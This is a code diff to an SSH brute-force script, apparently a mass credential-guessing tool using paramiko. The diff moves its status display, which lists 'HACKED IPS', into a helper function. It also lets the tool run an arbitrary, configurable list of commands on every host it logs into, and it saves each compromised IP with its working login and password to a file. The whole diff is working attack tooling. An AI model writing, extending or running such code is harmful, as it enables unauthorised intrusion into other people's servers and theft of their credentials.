@@ -1,4 +1,4 @@
-from scripts.helpers import Threads, get_good_ips, prepare
+from scripts.helpers import Threads, get_good_ips, prepare, show_brute_statistics
 from termcolor import colored
 import paramiko
 import os
@@ -25,16 +25,7 @@ def make_connection(ip: str, number: int, env):
                 if state:
                     current_creds[number] = [login, password]
                     
-                    os.system('clear')
-                    print('[SCAN] SCRIPT UNDER WORKING...')
-                    print("CURRENT IPS UNDER TESTING:")
-                    for j in range(len(current_work_ips)):
-                        try:
-                            print(current_work_ips[j], '-->', f'{current_creds[j][0]}:{current_creds[j][1]}')
-                        except IndexError:
-                            break # test this point as when ips list is small there will be always IndexErrors while ips are testing
-                    print(f'\n-----\n\nCHECKED IPS: {worked_ips}')
-                    print(f'\n-----\n\nHACKED IPS: {good_ips}')
+                    show_brute_statistics(current_work_ips, current_creds, worked_ips, good_ips)
                     
                     client = paramiko.SSHClient()
                     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
@@ -53,25 +44,19 @@ def make_connection(ip: str, number: int, env):
                         with open(f'{env["OUTPUT_FOLDER"]}{env["FILENAME_FOUND_IPS"]}', 'a') as found:
                             found.write(ip + f' | {login}:{password}\n')
                         
-                        if ENV['ALLOW_COMMANDS']:
-                            stdin1, stdout1, stderr1 = execute(client, 'hostname')
-                            stdin2, stdout2, stderr2 = execute(client, 'ip a')
-                        else:
-                            stdin1, stdout1, stderr1 = '-', '-', '-'
-                            stdin2, stdout2, stderr2 = '-', '-', '-'
-
-                        with open(f'{env["OUTPUT_FOLDER"]}{env["FILENAME_FOUND_IPS_EXTENDED"]}', 'a') as founde:
-                            founde.write(f'{stdout1.read().decode()}{ip}\n')
-                            founde.write(f'{stdout1.read().decode()}\n{stdout2.read().decode()}\n-----\n')
+                        if ENV['ALLOW_COMMANDS'] == 'true':
+                            commands = ENV['COMMANDS'].split(',')
+                            for command in commands:
+                                stdin, stdout, stderr = execute(client, command)
+                                with open(f'{env["OUTPUT_FOLDER"]}{env["FILENAME_FOUND_IPS_EXTENDED"]}', 'a') as founde:
+                                    founde.write(f'{stdout.read().decode()}{ip}\n')
                         
                         good_ips.append(ip)
-
                         state = False
-                        
                         break
-                        
                     client.close()
     worked_ips.append(ip)
+    show_brute_statistics(current_work_ips, current_creds, worked_ips, good_ips)
 
 def connect(ips: list, number: int, env):
     global current_work_ips
